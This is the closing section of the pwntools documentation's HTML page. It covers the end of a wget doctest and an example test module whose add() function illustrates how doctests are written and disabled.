<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">=</span> <span class="n">wget</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span>
<span class="go">&#39;User-agent: *\nDisallow: /deny\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result2</span> <span class="o">=</span> <span class="n">wget</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="kc">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">==</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;robots.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<div class="toctree-wrapper compound">
<span id="document-testexample"></span><div class="section" id="module-pwnlib.testexample">
<span id="pwnlib-testexample-example-test-module"></span><h3><a class="reference internal" href="#module-pwnlib.testexample" title="pwnlib.testexample"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.testexample</span></code></a> &#8212; Example Test Module<a class="headerlink" href="#module-pwnlib.testexample" title="Permalink to this headline">¶</a></h3>
<p>Module-level documentation would go here, along with a general description
of the functionality.  You can also add module-level doctests.</p>
<p>You can see what the documentation for this module will look like here:
<a class="reference external" href="https://docs.pwntools.com/en/stable/testexample.html">https://docs.pwntools.com/en/stable/testexample.html</a></p>
<p>The tests for this module are run when the documentation is automatically-generated
by Sphinx.  This particular module is invoked by an &#8220;automodule&#8221; directive, which
imports everything in the module, or everything listed in <code class="docutils literal"><span class="pre">__all__</span></code> in the module.</p>
<p>The doctests are automatically picked up by the <code class="docutils literal"><span class="pre">&gt;&gt;&gt;</span></code> symbol, like from
the Python prompt.  For more on doctests, see the <a class="reference external" href="https://docs.python.org/2/library/doctest.html">Python documentation</a>.</p>
<p>All of the syntax in this file is ReStructuredText.  You can find a
<a class="reference external" href="https://goo.gl/qEKFIu">nice cheat sheet here</a>.</p>
<p>Here&#8217;s an example of a module-level doctest:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)))</span>
<span class="go">6</span>
</pre></div>
</div>
<p>If doctests are wrong / broken, you can disable them temporarily.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> 
<span class="go">5</span>
</pre></div>
</div>
<p>Some things in Python are non-deterministic, like <code class="docutils literal"><span class="pre">dict</span></code> or <code class="docutils literal"><span class="pre">set</span></code>
ordering.  There are a lot of ways to work around this, but the
accepted way of doing this is to test for equality.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="p">{</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">1</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">)}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">==</span> <span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">:</span><span class="mi">3</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
<p>In order to use other modules, they need to be imported from the RST
which documents the module.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="s1">&#39;foo/bar&#39;</span><span class="p">)</span>
<span class="go">&#39;bar&#39;</span>
</pre></div>
</div>
<dl class="function">
<dt id="pwnlib.testexample.add">
<code class="descclassname">pwnlib.testexample.</code><code class="descname">add</code><span class="sig-paren">(</span><em>a</em>, <em>b</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/testexample.py#L45-64"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.testexample.add" title="Permalink to this definition">¶</a></dt>
<dd><p>Adds the numbers <code class="docutils literal"><span class="pre">a</span></code> and <code class="docutils literal"><span class="pre">b</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>a</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; First number to add</li>
<li><strong>b</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Second number to add</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The sum of <code class="docutils literal"><span class="pre">a</span></code> and <code class="docutils literal"><span class="pre">b</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
<span class="go">3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">add</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">)</span>
<span class="go">32</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
</div>
</div>
<div class="section" id="indices-and-tables">
<h1>Indices and tables<a class="headerlink" href="#indices-and-tables" title="Permalink to this headline">¶</a></h1>
<ul class="simple">
<li><a class="reference internal" href="genindex.html"><span class="std std-ref">Index</span></a></li>
<li><a class="reference internal" href="py-modindex.html"><span class="std std-ref">Module Index</span></a></li>
<li><a class="reference internal" href="search.html"><span class="std std-ref">Search Page</span></a></li>
</ul>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2016, Gallopsled et al..
      
        <span class="commit">
          Revision <code>cca1083f</code>.
        </span>
      

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  

  <div class="rst-versions" data-toggle="rst-versions" role="note" aria-label="versions">
    <span class="rst-current-version" data-toggle="rst-current-version">
      <span class="fa fa-book"> Read the Docs</span>
      v: stable
      <span class="fa fa-caret-down"></span>
    </span>
    <div class="rst-other-versions">
      <dl>
        <dt>Versions</dt>
        
          <dd><a href="/en/latest/">latest</a></dd>
        
          <dd><a href="/en/stable/">stable</a></dd>
        
          <dd><a href="/en/dev/">dev</a></dd>
        
          <dd><a href="/en/beta/">beta</a></dd>
        
      </dl>
      <dl>
        <dt>Downloads</dt>
        
          <dd><a href="//readthedocs.org/projects/pwntools/downloads/pdf/stable/">pdf</a></dd>
        
          <dd><a href="//readthedocs.org/projects/pwntools/downloads/htmlzip/stable/">htmlzip</a></dd>
        
          <dd><a href="//readthedocs.org/projects/pwntools/downloads/epub/stable/">epub</a></dd>
        
      </dl>
      <dl>
        <dt>On Read the Docs</dt>
          <dd>
            <a href="//readthedocs.org/projects/pwntools/?fromdocs=pwntools">Project Home</a>
          </dd>
          <dd>
            <a href="//readthedocs.org/builds/pwntools/?fromdocs=pwntools">Builds</a>
          </dd>
      </dl>
      <hr/>
      Free document hosting provided by <a href="http://www.readthedocs.org">Read the Docs</a>.

    </div>
  </div>



  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'./',
            VERSION:'3.10.0',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="_static/jquery.js"></script>
      <script type="text/javascript" src="_static/underscore.js"></script>
      <script type="text/javascript" src="_static/doctools.js"></script>

  

  
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>